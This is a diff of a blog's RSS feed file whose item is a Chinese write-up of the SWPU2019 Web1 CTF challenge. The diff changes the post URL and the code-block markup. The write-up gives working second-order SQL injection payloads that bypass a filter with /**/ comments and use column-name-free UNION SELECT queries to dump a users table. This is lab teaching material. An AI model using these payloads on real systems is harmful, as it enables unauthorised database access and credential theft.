@@ -8,10 +8,10 @@
         <language>zh-cn</language>
         <lastBuildDate>Thu, 15 Apr 2021 09:55:17 +0000</lastBuildDate><atom:link href="https://www.braindance.top/tags/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/index.xml" rel="self" type="application/rss+xml" /><item>
         <title>SWPU2019 Web1</title>
-        <link>https://www.braindance.top/posts/ctf/swpu2019web1/</link>
+        <link>https://www.braindance.top/articles/2021/04/swpu2019-web1/</link>
         <pubDate>Thu, 15 Apr 2021 09:55:17 +0000</pubDate>
         
-        <guid>https://www.braindance.top/posts/ctf/swpu2019web1/</guid>
+        <guid>https://www.braindance.top/articles/2021/04/swpu2019-web1/</guid>
         <description>&lt;p&gt;一个登陆界面，再看下url地址为login.php，确认了使用的是php&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210415091617.png&#34;
 	
@@ -50,8 +50,15 @@
 &gt;猜测应该是二次注入，发布时加上一些转义字符没有出现错误，但是查看详情时再次从数据库中取出带有payload的数据，可以执行sql语句。而且上面的单引号测试出来了是&lt;strong&gt;字符型单引号闭合&lt;/strong&gt;。&lt;/p&gt;
 &lt;p&gt;接下来是尝试过滤。我试出来的有空格（使用&lt;code&gt;/**/&lt;/code&gt;绕过）、or，and（可以使用&amp;amp;&amp;amp;，||），同时or被过滤，就说明保存数据库表名的库&lt;strong&gt;information_schema&lt;/strong&gt;没有办法查询，并且&lt;strong&gt;orderby&lt;/strong&gt;也不能使用，需要使用其他办法获取表内容。&lt;/p&gt;
 &lt;p&gt;测试一下当前表的字段数，从1开始加，一直会报字段数不匹配，直到尝试到22。还需要主义的是执行的sql语句后面的 &lt;code&gt;LIMIT 0,1&lt;/code&gt;需要闭合，所以最后添加了一个单引号&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&amp;#39;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210415092716.png&#34;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210415092716.png&#34;
 	
 	
 	
@@ -62,8 +69,15 @@
 &lt;p&gt;说明回显位是2和3。&lt;/p&gt;
 &lt;p&gt;由于没有办法查询表名，所以需要我们自己猜测，CTF比赛中常见的表名就是flag、users、举办方的缩写啥的。&lt;del&gt;这种没有办法查询表名的题目表名应该都不会设置太难&lt;/del&gt;&lt;/p&gt;
 &lt;p&gt;测试的语句&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/**/union/**/select/**/1,(select/**/*/**/from/**/flag),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&amp;#39;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;当测到&lt;code&gt;users&lt;/code&gt;表时返回了当前字段数不匹配的错误，说名users里有多个字段，肯定没有办法显示在一列中。所以接下来是猜users表的字段数。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/**/union/**/select/**/1,(select/**/*/**/from/**/flag),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;当测到&lt;code&gt;users&lt;/code&gt;表时返回了当前字段数不匹配的错误，说名users里有多个字段，肯定没有办法显示在一列中。所以接下来是猜users表的字段数。&lt;/p&gt;
 &lt;p&gt;首先讲解一波&lt;strong&gt;无列名注入&lt;/strong&gt;。&lt;/p&gt;
 &lt;p&gt;先来个正常表（flag）的查询&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;D:%5cDROPS%5cCTF%e6%af%94%e8%b5%9b%e9%a2%98%e8%a7%a3%5cBUUCTF%5cWeb%5c[SWPU2019]Web1%5c20210415094632.png&#34;
@@ -104,8 +118,15 @@
 &lt;p&gt;需要为子查询的结果再起一个别名（图中为&lt;code&gt;x&lt;/code&gt;），这样我们就不用列名查询到了字段。总结一下思路就是：自己构造一个表名并且联合查询想要查询的表名，再使用&lt;code&gt;group_concat&lt;/code&gt;函数输出自己构造的表名。&lt;/p&gt;
 &lt;p&gt;所以测试users表的字段数时，就通过形如上图的格式，改变联合查询的字段数判断。&lt;/p&gt;
 &lt;p&gt;最终的payload：&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/**/union/**/select/**/1,(select/**/group_concat(b)/**/from(select/**/1,2/**/as/**/a,3/**/as/**/b/**/union/**/select/**/*/**/from/**/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&amp;#39;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/**/union/**/select/**/1,(select/**/group_concat(b)/**/from(select/**/1,2/**/as/**/a,3/**/as/**/b/**/union/**/select/**/*/**/from/**/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;</description>
         </item>
         
     </channel>
